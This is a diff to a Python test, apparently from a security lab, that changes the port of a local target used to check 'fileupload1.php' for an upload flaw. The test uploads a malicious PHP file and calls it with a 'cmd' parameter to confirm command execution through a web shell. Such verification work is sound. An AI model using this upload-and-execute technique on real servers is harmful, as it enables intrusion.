@@ -6,7 +6,7 @@ def test_file_upload_vulnerability(session):
     """Test if file upload vulnerability exists in fileupload1.php"""
     
     # Setup
-    url = "http://localhost/FileUpload/fileupload1.php"
+    url = "http://localhost:9991/FileUpload/fileupload1.php"
     
     # Create a malicious PHP file for testing
     malicious_content = """<?php
@@ -27,7 +27,7 @@ def test_file_upload_vulnerability(session):
            "File upload vulnerability not confirmed - upload failed or was blocked"
     
     # Try to verify the file is accessible and executable
-    uploaded_url = "http://localhost/FileUpload/uploads/malicious.php"
+    uploaded_url = "http://localhost:9991/FileUpload/uploads/malicious.php"
     verify_response = session.get(uploaded_url, params={'cmd': 'echo test123'})
     
     # Check if we can execute commands through the uploaded file
